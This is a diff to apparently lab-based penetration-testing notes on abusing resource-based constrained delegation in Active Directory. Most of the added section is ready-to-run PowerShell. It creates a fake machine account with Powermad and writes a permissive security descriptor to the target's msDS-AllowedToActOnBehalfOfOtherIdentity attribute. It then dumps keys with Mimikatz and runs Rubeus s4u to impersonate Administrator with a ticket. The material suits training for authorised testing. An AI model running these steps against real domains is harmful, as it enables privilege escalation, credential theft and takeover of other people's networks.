@@ -100,20 +100,63 @@ Check if worked
 ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$ 
 ```
 
-### Resource based
+## Resource Based Delegation
 
-Instead of the white list of SPNs controlled by `msDS-AllowedToDelegateTo` attribute, resource based controoled by the `msDS-AllowedToActOnBehalfOfOtherIdentity`
+Instead of the white list of SPNs controlled by `msDS-AllowedToDelegateTo` attribute, resource based controlled by the `msDS-AllowedToActOnBehalfOfOtherIdentity`
 
-To abuse RBCD we need:
+To abuse RBCD we need Write permissions over the target machine `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
 
-1. Write permissions over the target service `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
-2. AD Object which has SPN configured&#x20;
+### Enumerate
 
-Abuse example:
-
-```
-# Create Computers - AD Object which has SPN configured 
-$comps = 'dcorp-student1$','dcorp-student2$'
-Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
+```powershell
+# Check if allowed to create machines
+Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select ms-ds-machineaccountquota
 ```
 
+### Exploitation
+
+#### Create fake machine
+
+```powershell
+# Using Powermad
+import-module powermad
+New-MachineAccount -MachineAccount dcorp-student483 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+
+#### Change security descriptor
+
+<pre class="language-powershell"><code class="lang-powershell">$TargetComputer = 'dcorp-mgmt'
+$FakeComputer = 'dcorp-student483'
+
+# Using PowerView
+$ComputerSid = Get-DomainComputer $FakeComputer -Properties objectsid | Select -Expand objectsid
+<strong>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+</strong>$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+# Using AD Module
+Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $FakeComputer 
+
+# Verify
+Get-DomainComputer dcorp-mgmt -Properties 'msds-allowedtoactonbehalfofotheridentity'
+# Verify Result
+msds-allowedtoactonbehalfofotheridentity
+----------------------------------------
+{1, 0, 4, 128...}
+</code></pre>
+
+#### Abuse using Rubeus
+
+```powershell
+## Get the fake machine hash
+Rubeus.exe hash /password:123456 /user:dcorp-student483 /domain:dollarcorp.moneycorp.local
+## If used AD Module need to extract the hash from lsass using mimikatz
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+
+# Imporsnate
+Rubeus.exe s4u /user:dcorp-student483$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:http/dcorp-mgmt /ptt
+
+# Verify (winrs on this case)
+winrs -r:dcorp-mgmt cmd
+```
